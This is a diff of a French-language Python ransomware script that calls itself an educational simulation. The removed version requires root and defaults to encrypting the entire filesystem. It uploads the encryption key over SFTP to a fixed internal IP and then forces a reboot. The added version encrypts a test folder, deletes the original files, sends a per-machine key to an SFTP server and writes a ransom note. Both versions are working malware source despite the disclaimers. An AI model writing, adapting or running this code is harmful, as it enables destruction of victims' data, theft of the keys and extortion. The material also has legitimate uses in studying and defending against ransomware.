@@ -1,186 +1,142 @@
+#!/usr/bin/env python3
+# SIMULATION RANSOMWARE ÉDUCATIF - ENV. DE TEST UNIQUEMENT
+
 import os
-import socket
-import subprocess
-import sys
-import paramiko
+import pysftp
+import hashlib
 from cryptography.fernet import Fernet
+from pathlib import Path
+import socket
+import getpass
+
+# ====================
+# CONFIGURATION SFTP
+# ====================
+SFTP_HOST = "votre_serveur_sftp.com"  # Remplacez par votre serveur
+SFTP_USER = "utilisateur_sftp"  # Remplacez par vos identifiants
+SFTP_PASS = "motdepasse_sftp"  # Remplacez par votre mot de passe
+SFTP_PORT = 22
+REMOTE_PATH = "/chemin/vers/dossier_clés/"  # Dossier sur le serveur SFTP
 
 
-def check_root():
-    """Vérifie si le script est exécuté en tant que root."""
-    if os.geteuid() != 0:
-        print("Ce script doit être exécuté en tant que root.")
-        sys.exit(1)
+# ====================
+# FONCTIONS DE CHIFFREMENT
+# ====================
+def generate_unique_key():
+    """Génère une clé unique basée sur l'identifiant machine"""
+    machine_id = hashlib.sha256(
+        f"{socket.gethostname()}-{getpass.getuser()}".encode()
+    ).digest()
+    return Fernet.generate_key(), machine_id.hex()[:8]
 
 
-def generate_key():
-    """Génère et enregistre une clé de chiffrement."""
-    key = Fernet.generate_key()
+def encrypt_file(filepath, key):
+    """Chiffre un fichier avec la clé fournie"""
     try:
-        with open("/root/secret.key", "wb") as key_file:
-            key_file.write(key)
-        os.chmod("/root/secret.key", 0o600)  # Restreint les permissions du fichier de clé
-        return key
-    except IOError as e:
-        print(f"Erreur lors de la création du fichier de clé: {e}")
-        sys.exit(1)
+        fernet = Fernet(key)
+        with open(filepath, "rb") as f:
+            data = f.read()
 
+        encrypted = fernet.encrypt(data)
 
-def load_key():
-    """Charge la clé de chiffrement."""
-    if not os.path.exists("/root/secret.key"):
-        print("Erreur: Le fichier de clé /root/secret.key n'existe pas")
-        sys.exit(1)
-    try:
-        with open("/root/secret.key", "rb") as key_file:
-            return key_file.read()
-    except IOError as e:
-        print(f"Erreur lors de la lecture du fichier de clé: {e}")
-        sys.exit(1)
+        with open(f"{filepath}.locked", "wb") as f:
+            f.write(encrypted)
 
-
-def send_key_to_sftp(key):
-    """Envoie la clé de chiffrement au serveur SFTP avec gestion d'erreur améliorée."""
-    sftp_host = "192.168.239.130"
-    sftp_port = 22
-    sftp_username = "test"
-    sftp_password = "test"
-    remote_path = "/secret.key"
-    timeout_seconds = 10
-
-    transport = None
-    sftp = None
-
-    try:
-        print(f"Tentative de connexion à SFTP {sftp_host}:{sftp_port}...")
-
-        # Création du transport avec timeout
-        transport = paramiko.Transport((sftp_host, sftp_port))
-        transport.banner_timeout = timeout_seconds
-        transport.connect(username=sftp_username, password=sftp_password)
-
-        # Création du client SFTP
-        sftp = paramiko.SFTPClient.from_transport(transport)
-
-        # Sauvegarde de la clé dans un fichier temporaire
-        temp_key_path = "/root/secret.key.tmp"
-        try:
-            with open(temp_key_path, "wb") as f:
-                f.write(key)
-
-            # Envoi du fichier vers le serveur SFTP
-            sftp.put(temp_key_path, remote_path)
-            print(f"Clé envoyée avec succès à {sftp_host}:{remote_path}")
-        finally:
-            # Suppression du fichier temporaire
-            if os.path.exists(temp_key_path):
-                os.remove(temp_key_path)
-
-    except paramiko.SSHException as ssh_err:
-        print(f"Erreur SSH lors de la connexion: {ssh_err}")
-    except socket.timeout:
-        print(f"Timeout: Le serveur SFTP n'a pas répondu dans les {timeout_seconds} secondes")
+        os.remove(filepath)
+        print(f"[+] Fichier chiffré: {filepath}")
+        return True
     except Exception as e:
-        print(f"Erreur inattendue lors de l'envoi de la clé via SFTP: {e}")
-    finally:
-        # Fermeture propre des connexions
-        if sftp:
-            sftp.close()
-        if transport:
-            transport.close()
+        print(f"[!] Erreur sur {filepath}: {str(e)}")
+        return False
 
 
-def encrypt_file(file_path, cipher):
-    """Chiffre un fichier en remplaçant son contenu."""
+# ====================
+# FONCTIONS SFTP SÉCURISÉES
+# ====================
+def sftp_connect():
+    """Établit une connexion SFTP sécurisée"""
+    cnopts = pysftp.CnOpts()
+    if not os.path.exists("known_hosts"):
+        cnopts.hostkeys = None  # Désactiver seulement pour les tests!
+    else:
+        cnopts.hostkeys.load("known_hosts")
+
+    return pysftp.Connection(
+        host=SFTP_HOST,
+        username=SFTP_USER,
+        password=SFTP_PASS,
+        port=SFTP_PORT,
+        cnopts=cnopts
+    )
+
+
+def upload_key_to_sftp(key, client_id):
+    """Upload la clé vers le serveur SFTP de manière sécurisée"""
+    key_filename = f"{client_id}_key.key"
+
     try:
-        # Vérifie que c'est un fichier standard
-        if not os.path.isfile(file_path) or os.path.islink(file_path):
-            return
+        # Écriture temporaire de la clé
+        with open(key_filename, "wb") as f:
+            f.write(key)
 
-        with open(file_path, "rb") as file:
-            data = file.read()
-        encrypted_data = cipher.encrypt(data)
-        with open(file_path, "wb") as file:
-            file.write(encrypted_data)
-    except (IOError, PermissionError) as e:
-        print(f"[ERREUR] Impossible de chiffrer {file_path}: {e}")
+        # Connexion et upload
+        with sftp_connect() as sftp:
+            sftp.chdir(REMOTE_PATH)
+            sftp.put(key_filename)
+            print(f"[+] Clé envoyée vers {REMOTE_PATH}{key_filename}")
 
-
-def decrypt_file(file_path, cipher):
-    """Déchiffre un fichier en restaurant son contenu original."""
-    try:
-        # Vérifie que c'est un fichier standard
-        if not os.path.isfile(file_path) or os.path.islink(file_path):
-            return
-
-        with open(file_path, "rb") as file:
-            encrypted_data = file.read()
-        decrypted_data = cipher.decrypt(encrypted_data)
-        with open(file_path, "wb") as file:
-            file.write(decrypted_data)
-    except (IOError, PermissionError) as e:
-        print(f"[ERREUR] Impossible de déchiffrer {file_path}: {e}")
+        # Nettoyage local
+        os.remove(key_filename)
+        return True
+    except Exception as e:
+        print(f"[!] Échec de l'upload SFTP: {str(e)}")
+        if os.path.exists(key_filename):
+            os.remove(key_filename)
+        return False
 
 
-def process_directory(directory, cipher, encrypt=True):
-    """Parcourt un dossier et chiffre/déchiffre chaque fichier tout en évitant les fichiers critiques du système."""
-    system_exclude = ["/proc", "/sys", "/dev", "/run", "/tmp", "/boot", "/root/secret.key"]
+# ====================
+# FONCTION PRINCIPALE
+# ====================
+def main():
+    print("""
+    *******************************************************
+    SIMULATION ÉDUCATIVE - ENVIRONNEMENT DE TEST UNIQUEMENT
+    Ce code montre comment les ransomwares fonctionnent
+    pour mieux s'en protéger. NE PAS UTILISER MALVEILLAMMENT.
+    *******************************************************
+    """)
 
-    if not os.path.exists(directory):
-        print(f"Erreur: Le répertoire {directory} n'existe pas")
-        return
+    # Génération de la clé unique
+    encryption_key, client_id = generate_unique_key()
+    print(f"[+] Clé générée (ID: {client_id})")
 
-    for root, _, files in os.walk(directory):
-        if any(root.startswith(excl) for excl in system_exclude):
-            continue
+    # Simulation de chiffrement (dossier test seulement)
+    test_files = list(Path("test_files").glob("*")) if Path("test_files").exists() else []
+    if test_files:
+        print("\n[+] Chiffrement des fichiers de test...")
+        for file in test_files:
+            if file.is_file() and not file.name.endswith(".locked"):
+                encrypt_file(file, encryption_key)
 
-        for file in files:
-            file_path = os.path.join(root, file)
-            try:
-                if encrypt:
-                    encrypt_file(file_path, cipher)
-                else:
-                    decrypt_file(file_path, cipher)
-                print(f"{'Chiffré' if encrypt else 'Déchiffré'} : {file_path}")
-            except Exception as e:
-                print(f"[ERREUR] sur {file_path}: {e}")
+    # Envoi de la clé vers le serveur SFTP
+    if upload_key_to_sftp(encryption_key, client_id):
+        # Affichage de la note de rançon
+        ransom_note = f"""
+        ==============================
+        VOS FICHIERS ONT ÉTÉ CHIFFRÉS!
+        ID: {client_id}
 
-
-def restart_system():
-    """Redémarre le système après chiffrement."""
-    print("Redémarrage du système dans 10 secondes...")
-    try:
-        subprocess.run(["shutdown", "-r", "now"], check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Erreur lors du redémarrage: {e}")
+        Contactez fake@example.com 
+        avec votre ID pour le paiement.
+        ==============================
+        """
+        print(ransom_note)
+        with open("RECOVER_FILES.txt", "w") as f:
+            f.write(ransom_note)
+    else:
+        print("[!] Échec de l'envoi de la clé - simulation annulée")
 
 
 if __name__ == "__main__":
-    try:
-        check_root()
-        directory = input("Entrez le chemin du dossier à traiter (/ pour tout le système) : ").strip()
-        if not directory:
-            directory = "/"  # Valeur par défaut si rien n'est entré
-
-        action = input("Tapez 'E' pour chiffrer ou 'D' pour déchiffrer : ").strip().upper()
-        while action not in ['E', 'D']:
-            print("Action non reconnue. Veuillez choisir 'E' ou 'D'.")
-            action = input("Tapez 'E' pour chiffrer ou 'D' pour déchiffrer : ").strip().upper()
-
-        if action == 'E':
-            key = generate_key()
-            send_key_to_sftp(key)
-        else:
-            key = load_key()
-
-        cipher = Fernet(key)
-        process_directory(directory, cipher, encrypt=(action == 'E'))
-
-        if action == 'E':
-            restart_system()
-    except KeyboardInterrupt:
-        print("\nOpération annulée par l'utilisateur")
-        sys.exit(1)
-    except Exception as e:
-        print(f"Erreur inattendue: {e}")
-        sys.exit(1)
+    main()
